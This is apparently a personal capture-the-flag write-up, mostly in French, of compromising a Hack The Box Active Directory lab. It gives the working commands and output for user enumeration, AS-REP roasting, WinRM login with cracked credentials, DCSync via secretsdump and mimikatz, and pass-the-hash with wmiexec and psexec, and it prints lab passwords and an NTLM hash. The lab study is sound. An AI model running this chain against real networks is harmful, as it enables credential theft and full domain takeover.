---
date: 2026-02-02
tags:
  - htb
  - AD
  - ldap
  - asrep-roast
  - dcsync
---

# Recon






# Exploit


on a ca ak le recon `EGOTISTICAL-BANK.LOCAL0`
```
ldapsearch -x -h 10.10.10.175 -s base namingcontexts
```


on fait ca et oon a bcp dinfo
```
root@kali# ldapsearch -x -h 10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
# extended LDIF
#
# LDAPv3
# base <DC=EGOTISTICAL-BANK,DC=LOCAL> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL                      
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20200216124516.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
```
mias rien d interessant

## port 88 kerberos

on peut user enum 
```
root@kali# kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/15/20 - Ronnie Flathers @ropnop

2020/02/15 14:41:50 >  Using KDC(s):
2020/02/15 14:41:50 >   10.10.10.175:88

2020/02/15 14:41:59 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:42:46 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:42:54 >  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:43:21 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:47:43 >  [+] VALID USERNAME:       Fsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 16:01:56 >  [+] VALID USERNAME:       sauna@EGOTISTICAL-BANK.LOCAL
2020/02/16 03:13:54 >  [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL
2020/02/16 03:13:54 >  [+] VALID USERNAME:       FSMITH@EGOTISTICAL-BANK.LOCAL
2020/02/16 03:24:34 >  Done! Tested 8295455 usernames (8 valid) in 17038.364 seconds
```


## asrep-roast

on fait ca et on trouve lle hash de fsmith
```
root@kali# GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sauna doesn't have UF_DONT_REQUIRE_PREAUTH set
```

on le crack et It returns the password, Thestrokes23

on se connecte a winrm et on a le flag
```
root@kali# evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents>
```






# PrivEsc


ak winpeas on trouve les creds pr un compte service
```
  [+] Looking for AutoLogon credentials(T1012)
Some AutoLogon credentials were found!!
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!    
```

on peut aussi le trouver en get-item de ce path 
`HKLM:\software\microsoft\windows nt\currentversion\winlogon`


parcontre le user n existe pas mais
```
*Evil-WinRM* PS C:\> net user

User accounts for \\                                  

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.
```
maybe c le pass de svc_loanmgr?

it works
```
root@kali# evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'

Evil-WinRM shell v2.1

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>
```


ak bloodhound on trouve ca pouvant mener a dcsync
![[Pasted image 20260202185506.png]]


on fait dcsync
```
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
```


aores on peut pass the hash as administrateur

```
root@kali# wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
egotisticalbank\administrator
```


sinon si on veut system shell on fait

```
root@kali# psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file TQeVYGvK.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service bEUo on 10.10.10.175.....
[*] Starting service bEUo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

# Cleanup




# Other Ways


## dcsync

on peut aussi fairte dcsync ak mimikatz sur windows

```
.\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit
```